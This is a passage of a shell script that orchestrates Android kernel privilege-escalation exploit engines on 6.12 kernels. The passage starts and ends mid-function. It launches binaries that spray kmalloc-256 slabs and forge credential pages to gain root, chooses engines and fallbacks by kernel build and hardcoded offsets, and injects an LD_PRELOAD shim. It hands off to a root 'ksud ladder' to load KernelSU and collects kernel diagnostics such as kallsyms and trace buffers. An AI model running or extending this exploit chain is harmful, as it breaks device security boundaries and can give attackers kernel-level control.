  # ★ 0.9.11c：run.flag 挪到「引擎真正启动前」才建。以前建在函数开头，
  #   ENGINE_HOLD / no-ksud / missing-payload 这些早退 return 时不会删它 →
  #   孤儿 flag 留到下一轮（哪怕已经冷重启过），被 LAST_RUN_ABORT 误判成
  #   "上一轮 panic 没收尾"，白吃一次点击（2026-11-07 18:52 ENGINE_HOLD →
  #   18:55 COLLECT_ONLY 现场，跨了一次正常重启）。
  rm -f /sdcard/.kmroot_crash_seen 2>/dev/null
  sync 2>/dev/null
  # ★ 0.9.7：保活/采样只在本轮第一次尝试时启动，自动重试不要开成多份
  if [ "${_TRACE_STARTED:-0}" != "1" ]; then
    trace_keepalive_start
    trace_probe_start
    _TRACE_STARTED=1
  fi
  [ -n "$KSUD" ] || { echo "ENGINE_FAIL reason=no-ksud（新版引擎要求先装管理器）"; return 12; }
  [ -x "$T61269X" ] || { echo "ENGINE_FAIL reason=missing-payload-km612x ($T61269X)"; return 12; }
  if pidof libkm612x.so >/dev/null 2>&1 || pidof km612x >/dev/null 2>&1; then
    echo "ENGINE_HOLD: 上一次的 km612x 还在跑"
    return 2
  fi
  # ★ 0.8.95：确认本机 slab 的真实几何。引擎在 0x692f4 硬编码按 8KB 页（32 个 256B 对象）
  #   统计 slab_own；本机 page=4096，若 kmalloc-256 是 order-0（16 对象/页），
  #   那 slab_own 永远只能到 16 —— "16/32" 不是抢占失败，是整整一页全占了却被判成一半。
  for _sp in /sys/kernel/slab/kmalloc-256 /sys/kernel/slab/:0000256 /sys/kernel/slab/:t-0000256; do
    [ -d "$_sp" ] || continue
    echo "SLAB_PROBE: $_sp order=$(cat "$_sp/order" 2>/dev/null) objs_per_slab=$(cat "$_sp/objs_per_slab" 2>/dev/null) object_size=$(cat "$_sp/object_size" 2>/dev/null) objects=$(cat "$_sp/objects" 2>/dev/null)"
  done
  rm -f km612x.log
  # ★ 0.8.95：把「强制不缓冲」shim 挪到 $D 再用 —— /sdcard 是 noexec，
  #   LD_PRELOAD 只能从可执行目录加载。shim 缺失时静默降级，不影响开跑。
  if [ -n "$KA" ] && [ -f "$KA/libkmflush.so" ]; then
    cp -f "$KA/libkmflush.so" "$D/libkmflush.so" 2>/dev/null && chmod 644 "$D/libkmflush.so" 2>/dev/null
  fi
  # ★ 0.8.96：预检 —— 拿 /system/bin/true 试加载。宁可丢日志，也不能让 shim
  #   把引擎本身搞得起不来（那会白烧掉一整轮）。
  _FL=""
  if [ -f "$D/libkmflush.so" ]; then
    if LD_PRELOAD="$D/libkmflush.so" /system/bin/true >/dev/null 2>&1; then
      _FL="$D/libkmflush.so"
    else
      echo "FLUSH_SHIM: 预检失败（链接器不认这个 shim），已放弃，本轮退回有缓冲"
    fi
  fi
  # ★ 0.9.11：每份日志都记下"这一轮交给内核的到底是哪份 ksud、多大、支不支持 late-load"
  echo "KSUD_FINAL: src=$KSUD_SRC size=$(ksud_sz "$KSUD")B path=$KSUD"
  # ★ 0.9.12 P0-2：KSUD_FINAL 报的是"管理器侧选中的候选"，引擎实际 exec 的是阶梯代理 ——
  #   别再拿 cand= 体积当 exec 对象（会误读成"还是单候选"）
  echo "KSUD_EFFECTIVE: $D/ksud_ladder.sh（0.9.12 阶梯代理，候选与结果见 KSU_LADDER_LOG）"
  # ★ 0.9.12：生成阶梯代理并交给引擎（引擎 one-shot exec 的不再是单个 ksud，
  #   而是这个代理 —— 代理内部多候选 × (kmi/bare) × 轮询 + 失败取证，见 write_ksud_ladder）
  write_ksud_ladder
  if [ -n "$_FL" ]; then
    echo "FLUSH_SHIM: on（引擎 stdout 改无缓冲 —— panic 也能留下最后一行）"
  else
    echo "FLUSH_SHIM: off（panic 时 km612x.log 可能为 0 字节）"
  fi
  # ★ 0.9.11c：到这里所有早退检查都已通过，引擎马上启动 —— 崩溃哨兵现在才立。
  #   （从函数开头挪过来的，见上面的注释：早退不能留孤儿 flag）
  : > "$D/run.flag" 2>/dev/null
  (
    # ★ 0.9.12：引擎 exec 的"ksud"其实是阶梯代理脚本 —— 引擎侧无需任何改动
    export KM612N_KSUD="$D/ksud_ladder.sh"; export KM612N_MANAGER_PKG="$MGR"; export KM612N_KMI="${KMI:-android16-6.12}"
    [ -n "$ND" ] && export TMPDIR="$D"
    [ -n "$_FL" ] && export LD_PRELOAD="$_FL"
    setsid sh -c "exec $KMPIN \"$T61269X\" fake > km612x.log 2>&1 < /dev/null" &
  )
  # ★ 0.8.95：增量回灌 —— 引擎一 flush 就立刻进 App 日志。
  #   脚本被打死也能留下现场（tailer 独立于引擎存活，最后再兜一次底）。
  (
    _o=0
    while :; do
      sleep 2
      _n=$(wc -c < km612x.log 2>/dev/null); [ -n "$_n" ] || _n=0
      if [ "$_n" -gt "$_o" ]; then
        tail -c +$((_o+1)) km612x.log 2>/dev/null | tr -d '\r' | sed 's/^/  > /'
        _o=$_n
      fi
      if ! pidof km612x >/dev/null 2>&1; then
        _n=$(wc -c < km612x.log 2>/dev/null); [ -n "$_n" ] || _n=0
        if [ "$_n" -gt "$_o" ]; then
          tail -c +$((_o+1)) km612x.log 2>/dev/null | tr -d '\r' | sed 's/^/  > /'
        fi
        break
      fi
    done
  ) &
  i=0
  while [ $i -lt $(iter_for "$E612_BUDGET") ]; do
    sleep 0.3
    i=$((i+1))
    if grep -qm1 "LATE_LOAD_RC=" km612x.log 2>/dev/null; then break; fi
    if grep -qm1 "FAIL_EXIT=" km612x.log 2>/dev/null; then break; fi
    if grep -qm1 "FAIL=probe" km612x.log 2>/dev/null; then break; fi
    # ★ 0.9.8：引擎一旦 park 就立刻收尾。以前这里会傻等到 E612_BUDGET(150s) 结束，
    #   期间脚本身一句输出都没有 —— App 侧"8 秒没新行 + 进程没活"的判据会误判成脚本死了，
    #   把后面 KSUD_PROBE / engine_digest / 日志尾部全丢掉（2026-11-07 17:53 现场）。
    if grep -qm1 "parking without reap" km612x.log 2>/dev/null; then _parked=1; break; fi
    if grep -qm1 "PARKED=1" km612x.log 2>/dev/null; then _parked=1; break; fi
    ( pidof libkm612x.so >/dev/null 2>&1 || pidof km612x >/dev/null 2>&1 ) || { sleep 1; break; }
  done
  # ★ 0.9.8→0.9.12：park 之后引擎已把阶梯代理 exec 起来（one-shot）。
  #   代理每候选最多 ~17s（exec + 2×8s 轮询），3 个候选最坏 ~50s —— 窗口从 30s 提到 90s，
  #   「模块出现」或「代理打出 END（全败取证完毕）」任一先到就收工；进度行带代理日志尾行。
  if [ "${_parked:-0}" = "1" ] && ! have_mod; then
    echo "PARK_WAIT: 引擎已 park → 等 ksud 阶梯代理落地（多候选×kmi/bare），最多 ${PARK_WAIT_S:-90}s"
    _pw=0; _pwt=$((${PARK_WAIT_S:-90} * 2))
    while [ "$_pw" -lt "$_pwt" ]; do
      have_mod && break
      grep -q '\[ladder\] END' "$D/ksu_ladder.log" 2>/dev/null && break
      sleep 0.5
      _pw=$((_pw+1))
      if [ $((_pw % 20)) -eq 0 ]; then
        echo "PARK_WAIT: $((_pw / 2))s mod=$(have_mod && echo yes || echo no) lad='$(tail -n 1 "$D/ksu_ladder.log" 2>/dev/null)'"
      fi
    done
  fi
  tlog ENGINE
  rm -f "$D/run.flag" 2>/dev/null
  # ★ 0.9.8：把引擎日志留一份"不会被冲掉"的副本 —— 重启/清理后会丢失 km612x.log，
  #   而下一轮就靠 ENGINE_PREV_LOG 回灌它来定性（17:53 那次全靠上一轮残留才看得到现场）。
  cp -f km612x.log "$D/km612x.last.log" 2>/dev/null
  cp -f km612x.log /sdcard/kmroot-last-km612x.log 2>/dev/null
  # ★ 0.9.0：execvp 成功时进程映像被 ksud 替换，引擎永远不会再打 LATE_LOAD_SHELL_RC。
  #   所以要直接问内核：ksud 还在不在？模块在不在？—— "人还在" 和 "人已经走了" 是两种完全不同的失败。
  # ★ 0.9.11c：主循环可能靠 pidof 探针 break（引擎先退出、park 标记后 flush），
  #   _parked 没置位 → PARK_VERDICT 显示 parked=0、后面却判 ENGINE_PARKED（18:46 现场）。
  #   打判据前重读一次日志，两边口径一致；失败但 park 的轮次也能因此带上 MOD_ENV/LOGCAT_KSU 探针。
  grep -qm1 "parking without reap" km612x.log 2>/dev/null && _parked=1
  grep -qm1 "PARKED=1" km612x.log 2>/dev/null && _parked=1
  echo "KSUD_PROBE: pid=$(pidof libksud.so 2>/dev/null)$(pidof ksud 2>/dev/null) kmod=$(grep -ci kernelsu /proc/modules 2>/dev/null) log=$(wc -c < km612x.log 2>/dev/null)B"
  echo "PARK_VERDICT: parked=${_parked:-0} mod=$(have_mod && echo yes || echo no) ksud=$(pidof libksud.so 2>/dev/null)$(pidof ksud 2>/dev/null) log=$(wc -c < km612x.log 2>/dev/null)B"
  # ★ 0.9.12 P0-2：统一判据行 —— 引擎 exec 的是阶梯代理，cand 固定报 ladder
  #   （单候选体积/rc 在 KSU_LADDER_LOG 里）；live=/proc/modules 里有没有 kernelsu；
  #   installed=su 是不是真的能用。su_ok 是最终证据：--allow-shell 生效后 shell 域执行
  #   /data/adb/ksu/bin/su -c id 应得 0。
  echo "LATE_VERDICT: cand=ladder live=$(have_mod && echo yes || echo no) installed=$(su_ok && echo yes || echo no)"
  # ★ 0.9.12：阶梯代理的全记录 —— 它是在引擎 child（root）里跑的，能看到 shell 域
  #   看不到的东西（/data/adb、dmesg、tombstones、crash buffer）。成败判据以此为准。
  if [ -s "$D/ksu_ladder.log" ]; then
    echo "KSU_LADDER_LOG: $(wc -c < "$D/ksu_ladder.log")B（root 身份跑的阶梯全记录）"
    sed 's/^/  | /' "$D/ksu_ladder.log"
  else
    echo "KSU_LADDER_LOG: 空 —— 代理脚本没跑起来（引擎 exec 阶段就死了？对照 km612x.log 的 LATE_LOAD_CMD）"
  fi
  for _kp in $(pidof libksud.so 2>/dev/null) $(pidof ksud 2>/dev/null); do
    echo "KSUD_STAT: pid=$_kp $(sed -n 's/^\(Name\|State\|Uid\|Gid\|Threads\):[[:space:]]*/\1=/p' /proc/$_kp/status 2>/dev/null | tr '\n' ' ')"
  done
  engine_digest km612x.log
  tail -n 25 km612x.log 2>/dev/null | sed 's/^/  | /'
  # ★ 0.9.9：park 过、但模块还是没上 → 再翻一次 logcat。ksud 有些错误（init_module 失败、
  #   avc denied、模块签名/vermagic）走的是 android_log 而不是 stderr，km612x.log 里看不到。
  #   shell 域能读 logcat；dmesg 读不到（dmesg_restrict），所以这条是最后一只手电筒。
  if [ "${_parked:-0}" = "1" ] && ! have_mod; then
    # ★ 0.9.10：环境侧三问 —— 这个 ROM 到底允不允许装模块？ksud 到底是死是活？
    #   modules_total=0 说明本机连厂商 LKM 都没在跑（模块加载被整体关掉的可能）；
    #   modules_disabled=1 就是"内核禁用了模块加载"（init_module 对谁都返回 EPERM）。
    echo "MOD_ENV: modules_disabled=$(cat /proc/sys/kernel/modules_disabled 2>/dev/null) tainted=$(cat /proc/sys/kernel/tainted 2>/dev/null) sig_enforce=$(cat /sys/module/module/parameters/sig_enforce 2>/dev/null) modules_total=$(wc -l < /proc/modules 2>/dev/null)"
    head -n 6 /proc/modules 2>/dev/null | sed 's/^/  * /'
    ps -A 2>/dev/null | grep -iE 'ksu|km612' | sed 's/^/  * /'
    for _kp in $(pidof libksud.so 2>/dev/null) $(pidof ksud 2>/dev/null); do
      echo "KSUD_DEEP: pid=$_kp state=$(cut -d' ' -f3 /proc/$_kp/stat 2>/dev/null) wchan=$(cat /proc/$_kp/wchan 2>/dev/null) sc=$(cat /proc/$_kp/syscall 2>/dev/null | cut -d' ' -f1-2)"
    done
    ls -ld /data/adb /data/adb/ksu /data/adb/modules 2>&1 | sed 's/^/  * /'
    echo "LOGCAT_KSU: park 后仍未装上模块 → 最近 logcat 里与 ksu/kernelsu/module 有关的行"
    logcat -d -t 400 2>/dev/null | grep -iE 'ksu|kernelsu|init_module|finit_module|vermagic|module.*(sign|verif)' | tail -n 30 | sed 's/^/  ! /'
    logcat -d -t 400 2>/dev/null | grep -iE 'avc: *denied' | tail -n 15 | sed 's/^/  ! /'
    echo "LOGCAT_KSU_END"
  fi
  if have_mod; then
    rm -f "$ENG_HINT" "$ENG_BAD" 2>/dev/null
    echo "KSU_LOADED（新版引擎已自己 late-load）"
    tlog ROOT
    return 0
  fi
  # ★ 0.8.52：新版 6.12 引擎的 preflight 自带 trace 通道检查（`REASON=trace channel unavailable`），
  #   撞上时直接归到 TRACEBLOCK（而不是笼统的 FASTFAIL）—— 结论对用户更有用。
  if grep -q "trace channel unavailable" km612x.log 2>/dev/null; then
    echo "TRACE_BLOCKED: 新版引擎 preflight 判 trace 通道不可用（本机 shell 开不了 kmem 事件）"
    TRACEBLOCK=1
    _EXP_NO_RETRY=1
    return 1
  fi
  if grep -q "REASON=kernel mismatch" km612x.log 2>/dev/null; then
    echo "KERNEL_MISMATCH: 新版 6.12 引擎判本机内核不在支持列表（preflight 阶段、未喷洒 → 可安全回落老引擎）"
    N612_MISMATCH=1
    _EXP_NO_RETRY=1
    return 1
  fi
  # ★ 0.8.67：PMW110 现场 —— 引擎过了版本/通道检查、kmem 事件也开起来了（[ids] page_alloc=334），
  #   却卡在 `[base] made=512 best=0 count=0` → `base calibration failed`。
  #   这是「本 build 的 trace 记录/指针布局与引擎假设不一致」，必须单独定性，
  #   否则只会落到笼统的 `km612x-no-module`，把人和后续适配都带偏。
  if grep -q "base calibration failed" km612x.log 2>/dev/null; then
    echo "ENGINE_BASECAL_FAIL: base 校准失败（[base] best=0 count=0）—— 本 build 布局与引擎假设不一致，不是脚本问题"
    # ★ 0.8.68：不用用户手建任何文件 —— 记下 release + 本次 BOOTID，
    #   下次冷重启（BOOTID 变了）自动改试老引擎。
    printf '%s|%s\n' "$SR" "${BOOTID:-unknown}" > "$ENG_HINT" 2>/dev/null \
      && echo "ENGINE_OLDNEXT_ARMED: 已记下（冷重启后自动改试老引擎，无需手动建文件）"
    N612_BASECAL=1
    _EXP_NO_RETRY=1
    return 1
  fi
  # ★ 0.9.8：引擎自己 park（PARKED=1 / parking without reap）= 它主动持页不走，
  #   这种状态**本次开机不能再试**（页面还挂在它手里），不能交给重试包装去连点。
  if grep -qE "parking without reap|PARKED=1" km612x.log 2>/dev/null; then
    echo "ENGINE_PARKED: 引擎已持页（parking without reap）→ 本次开机不能再跑，必须冷重启；这不是崩溃"
    _EXP_NO_RETRY=1
    return 1
  fi
  if grep -q "holder=km6120-hold" km612x.log 2>/dev/null; then
    echo "FAST_RETRYABLE: 新版引擎已把 zombie 交给 holder（holder=km6120-hold）→ 同一 boot 可以直接再点，不必重启"
    return 1
  fi
  echo "ENGINE_FAIL reason=km612x-no-module"
  return 1
}

# 已经真机验证过、确定走老引擎的 6.12 build（其余 build 一律先试新引擎）
KNOWN_612="6.12.69-android16-6-g242e1a07f878-ab15865446-4k"

# ★ 0.8.73：base 校准诊断块 —— 只在“两条引擎都失败”时抓一次，写进日志给作者。
#   0.8.72 是内联的，结果走到 .engine612.bad 的早退路径就什么都没抓到；
#   现在抽成函数，两处都调，并用 $STATEDIR/diag.done 保证只抓一次（不无限重复喷洒）。
diag_basecal() {
  echo "--- DIAG_BEGIN（给作者：base 校准需要的原始数据）---"
  echo "DIAG_UNAME: $(uname -a 2>/dev/null | tr -d '\r')"
  echo "DIAG_MEM: $(grep -m1 MemTotal /proc/meminfo 2>/dev/null | tr -d '\r')"
  echo "DIAG_PAGESIZE: $(getconf PAGE_SIZE 2>/dev/null)"
  echo "DIAG_TRACING_ON: $(cat /sys/kernel/tracing/tracing_on 2>/dev/null | tr -d '\r')"
  echo "DIAG_ENGINE_LOG_km612:"; sed -n '1,60p' km612.log 2>/dev/null | sed 's/^/  | /'
  if [ -f km612n.log ]; then
    echo "DIAG_ENGINE_LOG_km612n:"; sed -n '1,40p' km612n.log 2>/dev/null | sed 's/^/  | /'
  fi
  # ★ 0.9.2：late-load 成败全在阶梯代理里，以前的导出看不到 → 只能猜。
  if [ -f "$D/ksu_ladder.log" ]; then
    echo "DIAG_LADDER_LOG:"
    tail -n 40 "$D/ksu_ladder.log" 2>/dev/null | sed 's/^/  | /'
  fi
  echo "DIAG_KSUS: bundled=$( [ -x "$D/ksud" ] && "$D/ksud" --version 2>&1 | head -1 ) mgr=$( [ -n "$KSUD" ] && "$KSUD" --version 2>&1 | head -1 )"
  echo "DIAG_KALLSYMS_HEAD:"; head -n 5 /proc/kallsyms 2>/dev/null | sed 's/^/  | /'
  echo "DIAG_KPTR_RESTRICT: $(cat /proc/sys/kernel/kptr_restrict 2>/dev/null | tr -d '\r')"
  echo "DIAG_PERF_PARANOID: $(cat /proc/sys/kernel/perf_event_paranoid 2>/dev/null | tr -d '\r')"
  echo "DIAG_CMDLINE: $(cat /proc/cmdline 2>/dev/null | tr -d '\r')"
  if [ -r /sys/kernel/tracing/events/kmem/mm_page_alloc/format ]; then
    echo "DIAG_MMPAGEALLOC_FORMAT:"; sed -n '1,26p' /sys/kernel/tracing/events/kmem/mm_page_alloc/format 2>/dev/null | sed 's/^/  | /'
  fi
  for _c in 0 1; do
    if [ -r "/sys/kernel/tracing/per_cpu/cpu$_c/trace_pipe_raw" ]; then
      echo "DIAG_RAWDUMP_cpu$_c:"; od -An -tx8 -N 2048 "/sys/kernel/tracing/per_cpu/cpu$_c/trace_pipe_raw" 2>/dev/null | sed 's/^/  | /'
    fi
  done
  if [ -r /sys/kernel/tracing/trace ]; then
    echo "DIAG_TRACE_PEEK:"; grep -v '^#' /sys/kernel/tracing/trace 2>/dev/null | head -n 8 | sed 's/^/  | /'
    echo "DIAG_TRACE_PAGE_ALLOC:"; grep -m 6 "mm_page_alloc" /sys/kernel/tracing/trace 2>/dev/null | sed 's/^/  | /'
  else
    echo "DIAG_TRACE_PEEK: unreadable（shell 读不到 trace 文件）"
  fi
  echo "--- DIAG_END ---"
  printf '%s\n' "$DIAG_VER" > "$STATEDIR/diag.done" 2>/dev/null
}

run_612() {
  N612_MISMATCH=0
  _exp_tried=0
  _fb61_tried=0
  # ★ 0.8.66：引擎选择改成"按 build 是否已验证"自动决定，不再依赖手动开关：
  #   - 强制开关优先：/sdcard/kmroot-new612（强制新）、/sdcard/kmroot-old612（强制老）
  #   - 已验证 build（KNOWN_612）走老引擎 km612（行为已知）
  #   - **未知 build（如 PMW110 的 6.12.69-…g5fd39602326e-ab16372235）默认先试新引擎 km612n**，
  #     它按「6.12.69 + android16-6.12」KMI 判据放行，OTA 换 build 也大概率能跑；
  #     只有它 preflight 明确报 kernel mismatch（此时尚未喷洒）才回落老引擎，避免同 boot 二次喷洒。
  _prefer_new=0
  echo "ENGINE_STATE_DIR=$STATEDIR"
  # 这个 build 已经被判定"两条引擎都过不了 base 校准"：直接给结论，不再空跑（避免每轮都浪费一次喷洒机会）
  _bad=""
  [ -f "$ENG_BAD" ] && _bad=$(cat "$ENG_BAD" 2>/dev/null)
  _dgd=""
  [ -f "$STATEDIR/diag.done" ] && _dgd=$(cat "$STATEDIR/diag.done" 2>/dev/null)
  if [ -n "$_bad" ] && [ "$_bad" = "$SR" ]; then
    if [ "$_dgd" != "$DIAG_VER" ]; then
      # 上次判定“不支持”时没抓到诊断（例如走的是早退路径）→ 本轮自动补跑一次抓数据，
      # 抓完写 diag.done，之后才真正早退（不重复空跑）。
      echo "DIAG_COLLECT: 首次遇到已判定不支持的 build，自动再跑一轮抓诊断（只这一次）"
    else
      echo "ADAPT_ENGINE_UNSUPPORTED: 这个内核 build（$SR）两条 6.12 引擎都过不了 base 校准 —— 需要引擎侧适配，重试无意义"
      GATE_UNSUPPORTED=1
      return 1
    fi
  fi
  _auto_old=0
  if [ -f "$ENG_HINT" ]; then
    _h=$(cat "$ENG_HINT" 2>/dev/null)
    _hrel=${_h%%|*}
    _hboot=${_h#*|}
    if [ "$_hrel" = "$SR" ] && [ "$_hboot" != "${BOOTID:-unknown}" ]; then
      _auto_old=1
    fi
  fi
  if [ -f /sdcard/kmroot-old612 ]; then
    _prefer_new=0
  elif [ -f /sdcard/kmroot-new612 ]; then
    _prefer_new=1
  elif [ "$_auto_old" = "1" ]; then
    _prefer_new=0
    echo "ENGINE_AUTOFLIP: 上次新引擎在本 build 上 base 校准失败、且已经冷重启 → 本轮自动改试老引擎 km612（不用建文件）"
  elif [ "$SR" != "$KNOWN_612" ]; then
    _prefer_new=1
  fi
  # ★ 0.8.87：本 build 未验证、且实验引擎在 → 先把实验引擎跑掉。
  #   PMW110 上 km612n / km612 已连续两次日志证明必然停在 base 校准，
  #   先跑它们只是白白多两次引擎启动；现场脚本进程又容易被系统回收，
  #   把时间留给唯一有判据价值的那一次。
  if [ "$SR" != "$KNOWN_612" ] && [ -x "$T61269X" ] \
     && [ ! -f /sdcard/kmroot-old612 ] && [ ! -f /sdcard/kmroot-new612 ] \
     && [ ! -f /sdcard/kmroot-nox ]; then
    _exp_tried=1
    echo "ENGINE_EXP_FIRST: 本 build 未验证 → 先跑实验引擎 km612x（call_site 指纹已按本机符号表重算）"
    run_612x
    _xrc=$?
    if [ "$_xrc" = "0" ]; then return 0; fi
    trace_probe_summary
    if grep -q "base calibration failed" km612x.log 2>/dev/null; then
      echo "ENGINE_EXP_FIRST_BASECAL: 实验引擎也停在 base 校准 → 继续原有回落流程"
    else
      rm -f "$ENG_BAD" 2>/dev/null
      _cl=$(grep -m1 "\[cred\]" km612x.log 2>/dev/null | tr -d '\r')
      echo "ADAPT_BASE_OK: 实验引擎已通过 base 校准（后续阶段失败${_cl:+: $_cl}），已清掉「不支持」标记"
      return "$_xrc"
    fi
  fi
  if [ "$_prefer_new" = "1" ] && [ -x "$T61269N" ]; then
    if [ "$SR" = "$KNOWN_612" ]; then
      echo "ENGINE_PICK: km612n（/sdcard/kmroot-new612 强制）"
    else
      echo "ENGINE_PICK: km612n 优先（release=$SR 不在已验证列表 → 新引擎按 KMI 判据，新 build 优先）"
    fi
    run_612n
    _rc=$?
    if [ "$_rc" = "0" ]; then return 0; fi
    if [ "$TRACEBLOCK" = "1" ]; then return "$_rc"; fi
    if [ "$N612_MISMATCH" != "1" ]; then
      if [ "$N612_BASECAL" = "1" ]; then
        # ★ 0.8.71：base 校准失败时引擎**还没进入 cred 写入阶段**（日志停在 [base] 就退出、不持页），
        #   所以同 boot 直接换老引擎是安全的；也省得用户为"再来一次"反复重启（PMW110 现场已连重启 4 次）。
        echo "ENGINE_SAMEBOOT_FALLBACK: 上一引擎停在 base 校准（未写入、未持页）→ 本轮直接改试老引擎 km612，不用重启"
      else
        return "$_rc"
      fi
    fi
    echo "ENGINE_FALLBACK: 新引擎 preflight 判 kernel mismatch（未喷洒，安全）→ 回落老引擎 km612 再试一次"
  elif [ "$SR" != "$KNOWN_612" ]; then
    echo "ADAPT_UNVERIFIED: release=$SR 不在已验证列表，且没有新引擎载荷 → 只能按 6.12.69 老引擎硬试"
  fi
  # chmod 在 -x 之前（执行位丢了才救得回来）
  [ -n "$ND" ] || chmod 755 km612 km612su km612x 2>/dev/null
  [ -x "$T61269" ] && [ -x "$T61269SU" ] || { echo "ENGINE_FAIL reason=missing-payload-612 ($T61269 / $T61269SU)"; return 12; }
  SOCK=/data/local/tmp/km6120-root.sock
  # 6.12 家族分档：km612/km612n/km612x 的偏移都是按 6.12.69 编译的，
  # 其它 6.12.x build（38/58/23）必须有自己的 runner 或档案，硬跑等于野写。
  # （Shark v2.1 就是每档一个 libk61238/libk61258/libk61223，这里先把话说准，别一律报"不是 6.12.69"）
  case "$SR" in
    # 6.12.69 有两个 OTA 构建，调用点不一样；内置引擎的常量是按第一份（ab15865446）编的。
    *6.12.69*g5fd39602326e*)
      # 只警告、不拦截：内置引擎按第一份构建编的，让它在 base 校准阶段自己失败退出（安全），
      # 拦下来反而会让本来能跑的新引擎失去机会。
      echo "ENGINE_WARN_61269B: 本机是 6.12.69 的第二个 OTA 构建（g5fd39602326e-ab16372235）"
      echo "  内置 km612 系引擎的调用点按第一份构建编译；若 base 校准不过属预期，需要该构建的 boot.img 补档案" ;;
    *6.12.69*) : ;;
    # ★ 0.9.4：默认「识别到 6.12 就跑」——只警告不拦（strict 才拦）。
    #   km612 系会自己在 base 校准阶段失败退出（count=0），属于安全失败。
    *6.12.38*) if [ -f /sdcard/kmroot-strict ]; then
                 echo "ENGINE_GATE_61238: 本机是 6.12.38，km612 偏移按 6.12.69 编译（strict 模式拦截）"
                 GATE_UNSUPPORTED=1; return 1
               fi
               echo "ENGINE_WARN_61238: 本机是 6.12.38，不是 6.12.69 → 仍按 6.12.69 常量试跑（base 校准不过属正常）" ;;
    *6.12.58*) if [ -f /sdcard/kmroot-strict ]; then
                 echo "ENGINE_GATE_61258: 本机是 6.12.58（strict 模式拦截）"
                 GATE_UNSUPPORTED=1; return 1
               fi
               echo "ENGINE_WARN_61258: 本机是 6.12.58，不是 6.12.69 → 仍按 6.12.69 常量试跑" ;;
    *6.12.23*) if [ -f /sdcard/kmroot-strict ]; then
                 echo "ENGINE_GATE_61223: 本机是 6.12.23（strict 模式拦截）"
                 GATE_UNSUPPORTED=1; return 1
               fi
               echo "ENGINE_WARN_61223: 本机是 6.12.23，不是 6.12.69 → 仍按 6.12.69 常量试跑" ;;
    *) echo "ENGINE_GATE: $SR 不是 6.12.69（km612 的偏移按 6.12.69 编译）"; GATE_UNSUPPORTED=1; return 1 ;;
  esac
  if e612_alive; then
    echo "ENGINE_HOLD: 本次开机已有 km612 在跑（可能持页），冷重启后再试"
    return 2
  fi
  rm -f km612.log "$SOCK" 2>/dev/null
  if [ -e "$SOCK" ]; then
    echo "SOCKET_STALE: $SOCK 残留且删不掉（root 属主/不同 SELinux 标签）→ 612 只能先重启或手动删文件"
  fi
  echo "ENGINE_START engine=km612 mode=fake sock=$SOCK"
  setsid sh -c "exec $KMPIN \"$T61269\" fake > km612.log 2>&1 < /dev/null" &

  # 轮询 0.3s（原 1s）
  i=0
  n=0
  ROOTED=0
  while [ $i -lt $(iter_for "$E612_BUDGET") ]; do
    sleep 0.3
    i=$((i+1))
    n=$((n+1))
    if [ $((n % 10)) -eq 0 ]; then tail -n 2 km612.log 2>/dev/null | sed 's/^/  | /'; fi
    if grep -qm1 "ROOTD_READY" km612.log 2>/dev/null; then ROOTED=1; break; fi
    if grep -qm1 "parking without reap" km612.log 2>/dev/null; then break; fi
    e612_alive || break
  done
  tail -n 12 km612.log 2>/dev/null | sed 's/^/  | /'
  engine_digest km612.log
  if [ "$ROOTED" != "1" ]; then
    # 先认 TRACEBLOCK：这是"本机 ROM 不给 kmem 事件"，和"没命中/持页"是两码事，
    # 结论不同（前者重试无意义、要换慢链；后者必须冷重启）。
    if grep -q "page event ids not found" km612.log 2>/dev/null; then
      echo "ENGINE_LOG_FULL:"
      tail -n 30 km612.log 2>/dev/null | sed 's/^/  | /'
      echo "ENGINE_FAIL reason=traceblock（page event ids not found；本机没给 kmem 事件）"
      TRACEBLOCK=1
      return 1
    fi
    if grep -q "fake cred page held" km612.log 2>/dev/null; then
      echo "ENGINE_LOG_FULL:"
      tail -n 30 km612.log 2>/dev/null | sed 's/^/  | /'
      [ -n "$BOOTID" ] && echo "$BOOTID" > "$D/km612.hold"
      echo "ENGINE_FAIL reason=held（本次开机已持页，冷重启后再试）"
      return 2
    fi
    if e612_alive; then
      [ -n "$BOOTID" ] && echo "$BOOTID" > "$D/km612.hold"
      echo "ENGINE_FAIL reason=parked enforce=$(getenforce 2>/dev/null)（进程持页，别 kill）"
      return 2
    fi
    if grep -q "base calibration failed" km612.log 2>/dev/null; then
      # ★ 0.8.76：两条引擎都卡 base 校准时，试“实验引擎” km612x
      #   —— 它把硬编码的 call_site 指纹判据（[blob+8] & 0x1fffff == 0x1718f4）
      #   改成 nop，只保留 pid / bytes_req==256 / ptr∈内核空间 三个通用条件。
      if [ "$_exp_tried" != "1" ] && [ -x "$T61269X" ]; then
        _exp_tried=1
        echo "ENGINE_EXP: 两条引擎都停在 base 校准 → 试实验引擎 km612x（call_site 指纹已按本机符号表重算）"
        run_612x
        _xrc=$?
        if [ "$_xrc" = "0" ]; then return 0; fi
        trace_probe_summary
        if grep -q "base calibration failed" km612x.log 2>/dev/null; then
          echo "ENGINE_EXP_BASECAL: 实验引擎也 base 校准失败"
        else
          # ★ 0.8.77：实验引擎已经过了 base 校准（只是后续阶段还失败）
          #   → 这个 build 不再属于“ base 校准都不行”，清掉 bad 标记，下次不早退。
          rm -f "$ENG_BAD" 2>/dev/null
          _cl=$(grep -m1 "\[cred\]" km612x.log 2>/dev/null | tr -d '\r')
          echo "ADAPT_BASE_OK: 实验引擎已通过 base 校准（后续阶段失败${_cl:+: $_cl}），已清掉「不支持」标记"
          return "$_xrc"
        fi
      fi
      # ★ 6.1/6.12 兜底：TimerRoot 的 fast_61 引擎（吃 TIMEROOT_PROFILE + 自己开 kmem 事件）。
      #   6.12 的三个引擎（km612n/km612/km612x）都停 base 校准时，最后让 fast_61 用
      #   prof_09.txt（6.12.69 已修正内核串）再试一次 —— 它不依赖脚本 prep_trace 开事件，
      #   对「ROM 收走 enable 读权限」的机器更鲁棒，可能直接绕开 [base] count=0。
      if [ "$_fb61_tried" != "1" ] && [ -x "$(bpath kmfast61 kmfast61)" ]; then
        _fb61_tried=1
        echo "ENGINE_FB61: 6.12 引擎都停 base 校准 → 兜底试 TimerRoot fast_61（吃 prof_09 + 自己开事件）"
        run_fast61
        _frc=$?
        if [ "$_frc" = "0" ]; then return 0; fi
        if [ "$_frc" = "3" ]; then
          # fast_61 已拿到临时 root（KSU_MISSING），PARTIAL 已置 1，不再判死
          echo "FB61_PARTIAL: fast_61 已拿到临时 root，管理器 late-load 未成"
          return 3
        fi
        echo "FB61_FAIL: fast_61 也未成功（rc=$_frc），继续原有判死流程"
      fi
      _bl=$(grep -m1 "\[base\]" km612.log 2>/dev/null | tr -d '\r')
